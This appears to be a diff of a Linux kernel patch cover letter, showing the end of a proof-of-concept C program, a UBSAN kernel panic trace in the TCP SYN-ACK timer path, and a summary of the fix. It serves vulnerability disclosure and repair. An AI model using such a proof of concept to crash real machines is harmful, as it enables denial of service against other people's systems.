+	sent = sendto(sock, &packet, sizeof(packet), 0,
+		      (struct sockaddr *)&dst, sizeof(dst));
+	if (sent != (ssize_t)sizeof(packet)) {
+		if (sent < 0)
+			perror("sendto");
+		else
+			fprintf(stderr, "short send: %zd\n", sent);
+		close(sock);
+		return 1;
+	}
+
+	close(sock);
+	return 0;
+}
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+[  463.180218][    C3] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
+[  463.181502][    C3] CPU: 3 UID: 0 PID: 0 Comm: swapper/3 Not tainted 7.1.0-rc1 #2 PREEMPT(full)
+[  463.182748][    C3] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  463.184251][    C3] Call Trace:
+[  463.184723][    C3]  <IRQ>
+[  463.185125][    C3]  vpanic+0x6c3/0x790
+[  463.185795][    C3]  ? __pfx_vpanic+0x10/0x10
+[  463.186461][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.187264][    C3]  ? __show_trace_log_lvl+0x2f1/0x420
+[  463.188052][    C3]  panic+0xca/0xd0
+[  463.188605][    C3]  ? __pfx_panic+0x10/0x10
+[  463.189281][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.190089][    C3]  check_panic_on_warn+0x61/0x80
+[  463.190816][    C3]  __ubsan_handle_shift_out_of_bounds+0x1dd/0x2d0
+[  463.191774][    C3]  reqsk_timer_handler.cold+0x18/0x26
+[  463.192570][    C3]  ? __pfx_reqsk_timer_handler+0x10/0x10
+[  463.193389][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.194218][    C3]  ? __pfx_reqsk_timer_handler+0x10/0x10
+[  463.195181][    C3]  call_timer_fn+0x16b/0x500
+[  463.196028][    C3]  ? debug_object_deactivate+0x2e4/0x3b0
+[  463.197045][    C3]  ? trace_softirq_raise+0x11a/0x160
+[  463.197852][    C3]  ? __pfx_call_timer_fn+0x10/0x10
+[  463.198593][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.199411][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.200213][    C3]  ? rcu_is_watching+0x12/0xc0
+[  463.200904][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.201763][    C3]  __run_timers+0x5d9/0x9c0
+[  463.202468][    C3]  ? __pfx_reqsk_timer_handler+0x10/0x10
+[  463.203308][    C3]  ? __pfx___run_timers+0x10/0x10
+[  463.204049][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.204871][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.205704][    C3]  run_timer_base+0xfe/0x170
+[  463.206370][    C3]  ? __pfx_run_timer_base+0x10/0x10
+[  463.207115][    C3]  ? rcu_is_watching+0x12/0xc0
+[  463.207809][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.208619][    C3]  run_timer_softirq+0x10/0x30
+[  463.209311][    C3]  handle_softirqs+0x1ef/0xa00
+[  463.210022][    C3]  ? __pfx_handle_softirqs+0x10/0x10
+[  463.210788][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  463.211590][    C3]  __irq_exit_rcu+0x169/0x210
+[  463.212281][    C3]  irq_exit_rcu+0xe/0x30
+[  463.212885][    C3]  sysvec_apic_timer_interrupt+0xa3/0xc0
+[  463.213688][    C3]  </IRQ>
+[  463.214105][    C3]  <TASK>
+[  463.214538][    C3]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
+[  463.215398][    C3] RIP: pv_native_safe_halt+0xf/0x20
+[  463.216189][    C3] Code: 77 5b 02 e9 de d9 80 f6 0f 1f 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d d3 32 1a 00 fb f4 <e9> b7 d9 80 f6 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90 90
+All code
+========
+   0:	77 5b                	ja     0x5d
+   2:	02 e9                	add    %cl,%ch
+   4:	de d9                	fcompp
+   6:	80 f6 0f             	xor    $0xf,%dh
+   9:	1f                   	(bad)
+   a:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%rax)
+  10:	90                   	nop
+  11:	90                   	nop
+  12:	90                   	nop
+  13:	90                   	nop
+  14:	90                   	nop
+  15:	90                   	nop
+  16:	90                   	nop
+  17:	90                   	nop
+  18:	90                   	nop
+  19:	90                   	nop
+  1a:	90                   	nop
+  1b:	f3 0f 1e fa          	endbr64
+  1f:	eb 07                	jmp    0x28
+  21:	0f 00 2d d3 32 1a 00 	verw   0x1a32d3(%rip)        # 0x1a32fb
+  28:	fb                   	sti
+  29:	f4                   	hlt
+  2a:*	e9 b7 d9 80 f6       	jmp    0xfffffffff680d9e6		<-- trapping instruction
+  2f:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
+  36:	00 00 00 
+  39:	66 90                	xchg   %ax,%ax
+  3b:	90                   	nop
+  3c:	90                   	nop
+  3d:	90                   	nop
+  3e:	90                   	nop
+  3f:	90                   	nop
+
+Code starting with the faulting instruction
+===========================================
+   0:	e9 b7 d9 80 f6       	jmp    0xfffffffff680d9bc
+   5:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
+   c:	00 00 00 
+   f:	66 90                	xchg   %ax,%ax
+  11:	90                   	nop
+  12:	90                   	nop
+  13:	90                   	nop
+  14:	90                   	nop
+  15:	90                   	nop
+[  463.218880][    C3] RSP: 0018:ffa000000017fdf0 EFLAGS: 00000202
+[  463.219748][    C3] RAX: 00000000001a917f RBX: ff110001036c25c0 RCX: ffffffff8a8f7fa5
+[  463.220859][    C3] RDX: 0000000000000000 RSI: ffffffff8cc14de4 RDI: ffffffff8b0f3640
+[  463.221969][    C3] RBP: 0000000000000000 R08: 0000000000000001 R09: ffe21c0022fb67ed
+[  463.223076][    C3] R10: ff11000117db3f6b R11: 0000000000000072 R12: 0000000000000003
+[  463.224187][    C3] R13: ffe21c00206d84b8 R14: 0000000000000003 R15: ffffffff90914550
+[  463.225338][    C3]  ? ct_kernel_exit+0x125/0x180
+[  463.226067][    C3]  default_idle+0x9/0x10
+[  463.226686][    C3]  default_idle_call+0x6c/0xb0
+[  463.227379][    C3]  do_idle+0x469/0x590
+[  463.227983][    C3]  ? __pfx_do_idle+0x10/0x10
+[  463.228645][    C3]  ? finish_task_switch.isra.0+0x151/0x1050
+[  463.229524][    C3]  cpu_startup_entry+0x54/0x60
+[  463.230222][    C3]  start_secondary+0x213/0x2b0
+[  463.230905][    C3]  ? __pfx_start_secondary+0x10/0x10
+[  463.231687][    C3]  common_startup_64+0x13e/0x148
+[  463.232457][    C3]  </TASK>
+[  463.233555][    C3] Kernel Offset: disabled
+[  463.234244][    C3] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+
+
+
+Zhiling Zou (1):
+  tcp: bound SYN-ACK timers to reqsk timeout range
+
+ Documentation/networking/ip-sysctl.rst |  2 +-
+ include/net/tcp.h                      | 20 ++++++++++++++++----
+ net/ipv4/sysctl_net_ipv4.c             |  2 ++
+ net/ipv4/tcp.c                         |  2 +-
+ net/ipv4/tcp_timer.c                   |  6 ++++--
+ 5 files changed, 24 insertions(+), 8 deletions(-)
+
+-- 
+2.43.0
+
